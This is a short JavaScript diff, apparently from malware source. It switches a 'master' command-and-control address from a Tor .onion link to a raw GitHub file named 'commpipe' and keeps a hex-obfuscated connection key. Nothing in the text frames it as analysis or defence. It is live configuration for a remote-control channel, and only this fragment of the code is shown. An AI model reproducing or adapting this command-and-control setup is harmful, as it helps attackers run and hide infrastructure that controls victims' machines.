@@ -1,4 +1,4 @@
-var master = "https://p27rjz4oiu53u4gm.onion.link";
+var master = "https://raw.githubusercontent.com/FreakAnon420/Cloud9/refs/heads/master/commpipe";
 
 var connectKey = "\x4c\x55\x43\x4b\x59\x66\x75\x63\x6b\x69\x6e\x48\x61\x78\x30\x72";
 
